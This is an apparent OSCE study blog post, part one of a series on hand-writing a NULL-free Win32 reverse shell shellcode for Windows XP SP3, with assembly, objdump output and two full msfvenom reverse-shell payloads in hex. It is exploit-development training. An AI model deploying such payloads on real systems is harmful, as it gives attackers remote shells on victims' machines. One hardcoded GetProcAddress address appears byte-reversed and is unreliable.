---
layout: post
title: Windows Manual Shellcode
categories: [re,exploit]
tags: [osce]
fullview: false
comments: true
---
In this series we are going to write a Reverse Shell shellcode for Win32 from scratch while trying to reduce its size.

For achieving this goal, we will make this shellcode specific to Windows XP SP3 (English). This is necessary for we will hardcode some API functions addresses instead of dinamycally finding them.

Our shellcode will do pretty much the same as [this](http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/) one:

1. Load ws2_32.dll with LoadLibraryA
2. Get WSAStartUp with GetProcAddress
3. Call WSAStartUp
4. Get WSASocketA with GetProcAddress
5. Call WSASocketA
6. Get connect with GetProcAddress
7. Call connect
8. Call CreateProcessA
9. Call ExitProcess (optional)

It all starts with our `shellcode.s` file:

~~~
global _start

section .text

_start:
~~~

This part defines a global variable `_start`, which is the default entry point for nasm. When we assemble this file, nasm will search for `_start` so if we were not using this tag we would need to pass `-e myentrypointtag` parameter to the assembler.

We also define that what we are writing is the `.text` section. This section holds the instructions to be executed.

## Assembling and linking

Before we dive into our code let me say how we will transform it into a Windows executable file (.exe). Since I am developing the code in my Debian 9, here is what I do to assemble and link the `shellcode.s` file:

~~~
$ nasm -f win32 shellcode.s -o  shellcode.o
$ ld -m i386pe shellcode.o -o shared/shellcode.exe
~~~

The `shared` folder is shared (duh) with my Windows XP VM. This way I can develop the code in Linux and easily test it in Windows. 
Now lets move to the good stuff!

## Finding API calls addresses
As I stated above, we will use static addresses for the necessary API calls. We are actually trading off portability by lenght, which is what we want in this case.
The tool of choice here is `arwin.c`. You can find the code [here](http://www.vividmachines.com/shellcode/arwin.c). In order to compile it from Linux we install MinGW32:

~~~
$ sudo apt install mingw32
[...]
$ i686-w64-mingw32-gcc arwin.c -o shared/arwin.exe
~~~

That said and done, lets find all the addresses we are going to need.

![1-arwin]({{ "/assets/media/manualshellcode/shellcode_arwin.png" | absolute_url }})

## Load ws2_32.dll with LoadLibraryA
As stated [here](http://www.hick.org/code/skape/papers/win32-shellcode.pdf):

> In actuality, ws2_32.dll is likely already loaded in memory. The problem is, though, that one does not know where in memory it has been loaded at. As such, one can make use of LoadLibraryA to find out where it has been loaded at. If it has yet to be loaded, LoadLibraryA will simply load it and return the address it is mapped in at.

So if you are going, for example, to use this shellcode as a backdoor or in an exploit, please consider if the following snippet is really necessary. In most cases it won't be.

Lets check `LoadLibraryA` syntax:

~~~
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
~~~

> If you have ever questioned why MS provides both LoadLibraryA an LoadLibraryW, do check [here](https://docs.microsoft.com/en-us/windows/desktop/LearnWin32/working-with-strings).

Notice we want the string `ws2_32` to be used by the `LoadLibraryA` function as the `lpLibFileName` parameter.

Something tricky about manually writing shellcodes, however, is that one must take care when dealing with parameters on the stack. There are 3 points to consider about pushing strings onto the stack:

1. Litte endianess
2. Reverse order
3. End with \0

So if we are pushing  `ws2_32` we first divide it in 32 bits words like `ws2_` and `32\0\0` (more on this later). Now we put it in little endian notation as `_2sw` and `\0\023`. Next we push it in reverse order: first `_2sw` followed by `\0\023`.

Our stack will look like

~~~
_2sw  <<<\ESP
\0\023
~~~

But what about point 3? As you probably know, strings in C are nothing more than an array of chars, terminated with `\0`. This is actually a problem for us since doing so would insert NULL bytes into our shellcode, which may truncate it. In fact, what we did above will probably not work.

We need to insert a `\0` rigth after `ws2_32` without actually mentioning the character `\0`! Sounds weird huh? There are a few ways to manage this issue though. One of them is the following:

~~~
.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax		  	;push with \0 at the end without inserting NULLs
	push 0x5f327377 		;_2sw
	push esp			;pointer to the string

	mov ebx, 0x7c801d7b		;0x7b1d807c  	;addr of LoadLibraryA (0x7c801d7b)
	call ebx

	mov ebp, eax			;save winsock handle
~~~

The `.loadWinSock` is just a label that has no practical effect but to help documenting the code. We use `xor eax eax` to zero out `eax` register, which will be necessary for the next instructions.
Take a look at `mov ax, 0x3233` and `push eax`. You might be wondering why did we use a register to push a value. I mean, we could had used `push 0x3233`, right? The problem is that the rest of the 32 bits word would be padded with NULLs. Although that is just what we need, it would also mean our shellcode would contain NULL bytes, which is not what we want. However, when we do `mov ax, 0x3233`, we set the lowest 16bits of `eax`, while the rest is filled with zeros (remember we zeroed `eax`
before?). Now we have `eax as `\0\023`! The rest of the string is straight forward, just `push 0x5f327377`.
Finally, notice the `push esp` instruction. What we pass to the `LoadLibraryA` function is not the file name string, but a **pointer** to it. Since our string is right on the top of the stack, `esp` is exactly what we need.

Lets extract the opcodes for our shellcode:

~~~
$ objdump -d shared/shellcode.exe -M intel32
[...]
00401000 <_start>:
  401000:	31 c0                	xor    eax,eax
  401002:	66 b8 33 32          	mov    ax,0x3233
  401006:	50                   	push   eax
  401007:	68 77 73 32 5f       	push   0x5f327377
  40100c:	54                   	push   esp
  40100d:	bb 7b 1d 80 7c       	mov    ebx,0x7c801d7b
  401012:	ff d3                	call   ebx
  401014:	89 c5                	mov    ebp,eax
[...]
~~~

Awesome, no NULLs.
Here it is how it would be had we pushed the string directly:

~~~
	push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
	push 0x5F327377        ; ...
	push esp               ; Push a pointer to the "ws2_32" string on the stack.
	push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
	call ebp               ; LoadLibraryA( "ws2_32" )
~~~

~~~
00401000 <_start>:
  401000:	68 33 32 00 00       	push   0x3233
  401005:	68 77 73 32 5f       	push   0x5f327377
  40100a:	54                   	push   esp
  40100b:	68 4c 77 26 07       	push   0x726774c
  401010:	ff d5                	call   ebp
~~~

OMG NULLs! We would probably need to encode this shellcode to remove them, which would imply in a longer shellcode.

> The last snippet was extracted from [Metasploit's shellcode](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm).

Take a look at a reverse shell payload generated with Metasploit:

~~~
$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f hex
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hex file: 648 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a8000b680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
~~~

![2-meme1]({{ "/assets/media/manualshellcode/shellcode_meme1.png" | absolute_url }})

See? Lots of NULLs, including the ones from `68 33 32 00 00`. Let's remove them:

~~~
$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f hex -b '\x00'
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of hex file: 702 bytes
bfa87a2e36d9e1d97424f45829c9b152317812037812834086ccc36c9f932c8c60f4a5695134d1fac28491aeee6ff75a641dd06dcda80640ce817bc34cd8af236c13a222a94e4f766204e26607503f0d5b7447f22c7766a5272ea844eb5ae15ee867bbd5da1c3a3f13dc917e9b2feb471cd09eb15e6d99061ca92c9c863a967836ee410b345b0553595acae865d7ed3eeca3c99ab47073bb10d68cdbfa87289017d340fb7f106903803efa70b2e1501efe6a7fd90141c775fc6a385c3b3e68f6ea3fe30612eaa456bc4505067c36ed4c73690d6f5902a48a0aed9194c185e394c4096d728ca13b2d395b66a5d8a4bcc0db2f333595c73e2542287517c537a33f89aa28bfc4d6e6e88129ff7c3c13a962bdc592261a361ca7ef023ab7298a06e3e5ddd05d40b492371a6b7ddfdb47be99e38d484555780d7a5aec9903868c66de02bc2c422255e91776380ac2b54589e645b2918340fe1578396ff07eee90d1
~~~

Metasploit encodes the shellcode with [shikata-ga-nai](https://marcosvalle.github.io/re/exploit/2018/08/25/shikata-ga-nai.html) in order to remove the NULL bytes, which adds **27** more bytes.

But enough of automated tools, lets come back to our rudimental shellcode.

## Get WSAStartUp with GetProcAddress
Now that we have WinSock DLL loaded, next step is to get WSAStartup address so we can call it. We use GetProcAddress for it. Here it is its syntax:

~~~
FARPROC GetProcAddress(
  HMODULE hModule,
  LPCSTR  lpProcName
);
~~~

Since we have saved the returned handle from WinSock in `ebp`, we can use it now.

~~~
.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075      ; 'up'
	push eax
	push 0x74726174     ; 'trat'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;winsock handler
	
	mov ebx, 0x40ae807c ;addr of GetProcAddress
	call ebx
~~~

Lets take a break, compile this code and see how things look like in Immunity Debugger:

![3-dbg1]({{ "/assets/media/manualshellcode/shellcode_dbg1.png" | absolute_url }})
![4-dbg2]({{ "/assets/media/manualshellcode/shellcode_dbg2.png" | absolute_url }})
![5-dbg3]({{ "/assets/media/manualshellcode/shellcode_dbg3.png" | absolute_url }})

Great! In the next parts we will continue this development.
